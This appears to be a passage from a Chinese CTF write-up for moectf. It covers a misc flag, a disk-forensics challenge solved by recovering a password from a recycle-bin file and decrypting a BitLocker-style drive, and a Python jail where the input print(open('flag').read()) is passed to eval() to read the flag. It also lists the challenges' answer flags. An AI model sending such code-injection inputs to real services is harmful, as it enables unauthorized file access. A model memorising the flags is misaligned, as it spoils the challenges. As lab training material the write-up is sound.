
**喵喵？作为-
喵喵喵为.**

![](https://s2.loli.net/2024/03/08/WMEHSqIQfGF6Anz.png)

**moectf{THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX}**

### 随身携带的虚拟机

取证



下载附件

![](https://s2.loli.net/2024/03/08/5wpbltBdJykv9EC.png)

**左下添加一个硬盘，选择附件文件，别的操作不动即可**

![](https://s2.loli.net/2024/03/08/N1DV2Rv7zFb6fgo.png)

**开机后发现两个盘，一个加密一个未加密，从未加密的盘里找到 key 再去解密加密盘即可**

![](https://s2.loli.net/2024/03/08/NUTCXM8tokguyE2.png)

$RECYCLE.BIN/S-1-5-21-3152099865-1651255762-3118541945-500/$RMJ65VN.TXT

此处找到密码

![](https://s2.loli.net/2024/03/08/Ee1gP6ywsWAUMxJ.png)

把密码给到第一个盘解密后打开

![](https://s2.loli.net/2024/03/08/ve5QH9dltNAfm76.png)

![](https://s2.loli.net/2024/03/08/DLMuUqgXEVcNobk.png)

base64 解密

![](https://s2.loli.net/2024/03/08/JHN8jhp3To5gD6X.png)

**moectf{Bas1c_D15k_F0r3ns1cs!}**

###   Jail Level 0

   python 知识



题目：eval(用户输入)

这里尝试直接读取 flag

![](https://s2.loli.net/2024/03/08/ojNYIhl7KwmLWXy.png)

和今年国赛初赛的签到题一样的，只不过 flag 不在根目录就在当前目录

![](https://s2.loli.net/2024/03/08/cBWumawOLH2jTrn.png)

**print(open('flag').read())**

**flag{dR6GEZKWSwldDRfgEiPr-_moppEM_U20}**